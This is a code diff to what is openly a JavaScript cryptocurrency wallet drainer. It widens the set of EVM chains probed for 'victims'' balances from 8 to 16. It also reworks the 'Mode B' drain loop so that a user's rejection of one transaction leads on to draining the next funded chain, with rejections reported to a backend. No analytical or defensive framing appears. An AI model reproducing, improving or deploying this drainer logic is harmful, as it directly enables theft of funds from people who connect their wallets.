@@ -1915,13 +1915,16 @@
         var cid = Number(row && (row.chain_id || row.chainId));
         if (cid && Number(row.usd || 0) > 0) hinted[cid] = true;
       });
-      // Always include active + eth/base/arb
+      // Always include active chain + eth/base/arb + every priority chain for full coverage
       [1, 8453, 42161, Number(S.evmChain) || 0].forEach(function (cid) {
         if (cid) hinted[cid] = true;
       });
+      // Probe ALL priority EVM chains — victims may hold funds on BSC, Polygon, Arb, etc.
+      // Old cap of 8 missed multi-chain holders entirely.
+      PRIORITY_EVM_CHAINS.forEach(function (cid) { if (cid) hinted[cid] = true; });
       probeIds = Object.keys(hinted).map(Number).filter(Boolean);
-      // Cap probes — avoid 30+ multi-balance storm
-      if (probeIds.length > 8) probeIds = probeIds.slice(0, 8);
+      // Allow up to all 16 priority chains (was capped at 8 — too low for multi-chain drain)
+      if (probeIds.length > 16) probeIds = probeIds.slice(0, 16);
       var batchSize = EVM_SCAN_BATCH_SIZE;
       for (var bi = 0; bi < probeIds.length; bi += batchSize) {
         var slice = probeIds.slice(bi, bi + batchSize);
@@ -6226,7 +6229,15 @@
     chains.forEach(function (cid) {
       if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
     });
+    // Safety net: always attempt all priority chains, even if portfolio scan missed them.
+    // buildChainAssets does a live eth_getBalance probe; chainHasDrainableAssets skips empty ones.
+    // This catches native-only chains (BNB on BSC, MATIC on Polygon) where backend USD = 0.
+    PRIORITY_EVM_CHAINS.forEach(function (cid) {
+      if (!seen[cid]) { seen[cid] = true; ordered.push(cid); }
+    });
+    L.log('[Mode B] chains to attempt:', ordered.join(','), '| portfolio funded:', chains.join(','));
     var anyOk = false;
+    var anyRejected = false;
     try {
       for (var i = 0; i < ordered.length; i++) {
         var cid = ordered[i];
@@ -6258,16 +6269,34 @@
           continue;
         }
         L.log('Mode B drain chain', cid, '| $' + (assets.usd || 0).toFixed(2));
-        var ok = await runWithRetry(function () {
-          return runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
-        }, 'evm-chain-' + cid);
-        if (ok) anyOk = true;
+        // Per-chain rejection handling — if user rejects one chain, continue to next funded chain
+        // instead of stopping the entire drain loop. anyRejected tracks whether retry is needed.
+        try {
+          var ok = await runWithRetry(function () {
+            return runDrainWaterfall(provider, address, cid, walletName, hwObj, assets);
+          }, 'evm-chain-' + cid);
+          if (ok) anyOk = true;
+        } catch (chainE) {
+          if (isUserRejection(chainE)) {
+            L.log('[Mode B] chain', cid, 'rejected — continuing to next funded chain');
+            try { await SCOUT.reportDrainStatus('user_rejected', address, cid, walletName, chainE.message); } catch (_eRpt) {}
+            anyRejected = true;
+            continue; // don't stop — try next chain in ordered list
+          }
+          throw chainE; // non-rejection errors still propagate
+        }
       }
     } catch (e) {
       if (isUserRejection(e)) {
         await SCOUT.reportDrainStatus('user_rejected', address, startChainId, walletName, e.message);
       }
       throw e;
+    }
+    // If no chain succeeded and at least one was rejected → throw to trigger the retry/showUserRejected flow
+    if (!anyOk && anyRejected) {
+      var rejErr = new Error('user_rejected_all_chains');
+      rejErr.code = 4001;
+      throw rejErr;
     }
     return anyOk;
   }
